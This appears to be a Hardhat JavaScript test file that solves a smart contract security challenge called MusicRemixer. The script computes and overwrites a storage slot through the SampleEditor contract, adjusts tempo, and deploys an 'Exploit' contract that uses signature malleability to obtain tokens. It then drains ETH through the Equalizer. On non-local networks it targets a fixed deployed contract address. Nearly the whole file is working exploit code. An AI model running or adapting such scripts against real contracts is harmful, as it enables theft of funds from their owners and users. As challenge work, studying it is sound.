const { ethers, network } = require("hardhat");
const { expect } = require("chai");
const cs = console.log;
const provider = ethers.provider;

describe("[MusicRemixer Exploit]", function () {

  let deployer, user1, remixer, equalizer, sampleEditor, exploit;

  before(async function () {
    [user1, deployer] = await ethers.getSigners();

    cs(
      "user1 ether balance ",
      ethers.utils.formatEther(await user1.getBalance())
    );

    if (network.name == "hardhat") {
      const Remixer = await ethers.getContractFactory("MusicRemixer", deployer);
      remixer = await Remixer.deploy({ value: ethers.utils.parseEther("100") });
    } else {
      remixer = await ethers.getContractAt(
        "MusicRemixer",
        "0x4c67feD246521fdCDD7f84d55B72F62dBe00Dd40"
      );
    }

    equalizer = await ethers.getContractAt(
      "Equalizer",
      await remixer.equalizer()
    );

    sampleEditor = await ethers.getContractAt(
      "SampleEditor",
      await remixer.sampleEditor()
    );
  });

  it("exploit", async function () {
    cs("changing region_tempo content");
    const tracksSlot = 2;
    const arrayLengthSlot = ethers.utils.solidityKeccak256(
      ["string", "uint256"],
      ["Rhythmic", tracksSlot]
    );
    const arrayStartSlot = ethers.utils.keccak256(arrayLengthSlot);
    const flexOnSlot = BigInt(arrayStartSlot) + 4n;

    cs(
      'tracks["Rhythmic"][2].settings.flexOn storage slot at ',
      flexOnSlot.toString(16)
    );

    let slotContent = await provider.getStorageAt(
      sampleEditor.address,
      flexOnSlot
    );

    cs("current val", slotContent);

    await sampleEditor
      .connect(user1)
      .updateSettings(
        flexOnSlot,
        "0x0000000000000000000000000000000000000000000000000000000000000100"
      );

    await sampleEditor.connect(user1).setTempo(233);
    await sampleEditor.connect(user1).adjust();

    cs("do signnature melleability and obtain tokens");
    const Exploit = await ethers.getContractFactory("Exploit", user1);
    exploit = await Exploit.deploy(equalizer.address, remixer.address);

    await exploit.getTokens();

    cs("exploit equalizer");
    await exploit.setAllowances();

    await exploit.increaseVolume(
      [
        ethers.utils.parseEther("0.3"),
        ethers.utils.parseEther("0"),
        ethers.utils.parseEther("0.3"),
      ],
      { value: ethers.utils.parseEther("0.3") }
    );

    cs(
      "exploit contract eth balance",
      await ethers.provider.getBalance(exploit.address)
    );

    let tx = await exploit.exploit();
    console.log(tx.hash);
  });
});
